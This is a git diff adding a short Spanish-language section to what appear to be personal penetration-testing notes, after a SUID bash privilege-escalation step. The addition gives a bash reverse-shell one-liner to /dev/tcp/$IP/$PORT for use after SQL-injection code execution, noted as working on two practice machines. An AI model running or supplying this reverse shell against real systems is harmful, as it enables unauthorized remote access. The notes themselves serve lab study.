@@ -23,3 +23,13 @@ Wait a While ...
 /bin/bash -p
 whoami
 ```
+
+### Problemas para reverse shell dentro de sqli
+
+Hay veces que cuando puedo obtener RCE mediante una sqli porque tengo acceso de escritura con el user de la db que maneja la aplicación web no siempre me quiere ejecutar bien una revshell, pero con esto sí:
+
+```
+bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
+```
+
+es el único que me vino funcionando en 2 maquinas de SQLI
